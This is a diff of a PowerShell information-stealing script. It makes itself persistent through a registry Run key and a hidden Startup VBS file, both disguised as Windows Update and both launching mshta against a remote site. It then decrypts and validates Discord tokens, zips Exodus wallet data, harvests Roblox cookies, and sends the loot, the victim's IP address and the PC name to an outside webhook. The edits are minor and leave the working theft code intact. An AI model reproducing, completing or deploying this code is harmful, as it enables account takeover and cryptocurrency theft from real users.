@@ -7,24 +7,21 @@ $WH = "https://api.dicerigx.app/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5
 
 function dbg($title, $desc, $color) {
     $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
-    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch {}
+    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' -TimeoutSec 3 | Out-Null } catch {}
 }
 
 # =====================================================================
-# ─── SELF-PERSISTENCE (MSHTA) ───
+# ─── PERSISTENCE ───
 # =====================================================================
 try {
     $CMD = 'mshta.exe "https://dicerigx.app/"'
     Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "WinUpdate" -Value $CMD -ErrorAction SilentlyContinue
     $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
-    $VBSContent = "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False"
-    Set-Content -Path $StartupVBS -Value $VBSContent -ErrorAction SilentlyContinue
-    dbg ":pushpin: Persistence" "MSHTA startup methods installed" 65280
+    Set-Content -Path $StartupVBS -Value "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False" -ErrorAction SilentlyContinue
 } catch {}
 
 # =====================================================================
-# ─── STEALING LOGIC: CRYPTO SETUP ───
+# ─── DISCORD TOKENS ───
 # =====================================================================
 Add-Type -AssemblyName System.Security
 $csharp = @"
@@ -52,11 +49,6 @@ public class Gcm {
 Add-Type -TypeDefinition $csharp -Language CSharp
 
 $appdata = $env:APPDATA
-$l = $env:LOCALAPPDATA
-
-# =====================================================================
-# ─── DISCORD TOKENS ───
-# =====================================================================
 $mk = $null
 try {
     $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
@@ -90,7 +82,7 @@ foreach ($dp in $discordPaths) {
 
 foreach ($t in $tokens.Keys) {
     try {
-        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
+        $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 3
         if ($r.username) {
             $info = "**User:** $($r.username)`n"
             if ($r.email) { $info += "**Email:** $($r.email)`n" }
@@ -103,7 +95,7 @@ foreach ($t in $tokens.Keys) {
 }
 
 # =====================================================================
-# ─── WALLET (EXODUS ONLY) ───
+# ─── EXODUS WALLET ONLY ───
 # =====================================================================
 $dw = @{ Exodus="$appdata\Exodus" }
 $staging = Join-Path $env:TEMP "wallets"
@@ -123,10 +115,9 @@ foreach ($d in $stagedDirs) {
     Remove-Item $zip -Force -EA SilentlyContinue
     Compress-Archive -Path $d.FullName -DestinationPath $zip -Force -EA SilentlyContinue
     if (Test-Path $zip) {
-        $mb = [Math]::Round((Get-Item $zip).Length / 1MB, 2)
         if ((Get-Item $zip).Length -lt 8000000) {
             & curl.exe -s -F "file=@$zip;filename=$($d.Name).zip" $WH 2>&1 | Out-Null
-            dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip - $mb MB" 65280
+            dbg ":briefcase: Wallet Grabbed" "$($d.Name).zip" 65280
         }
         Remove-Item $zip -Force -EA SilentlyContinue
     }
@@ -134,8 +125,9 @@ foreach ($d in $stagedDirs) {
 Remove-Item $staging -Recurse -Force -EA SilentlyContinue
 
 # =====================================================================
-# ─── ROBLOX COOKIES ───
+# ─── ROBLOX COOKIE (RAW ROBLOSECURITY) ───
 # =====================================================================
+$l = $env:LOCALAPPDATA
 $rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
 foreach ($rp in $rbxPaths) {
     if (Test-Path $rp) {
@@ -164,6 +156,6 @@ foreach ($rp in $rbxPaths) {
 # ─── SYSTEM INFO ───
 # =====================================================================
 try {
-    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
+    $ip = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 3).Trim()
     dbg ":dart: Target" "**IP:** $ip `n**PC:** $env:COMPUTERNAME" 3447003
 } catch {}
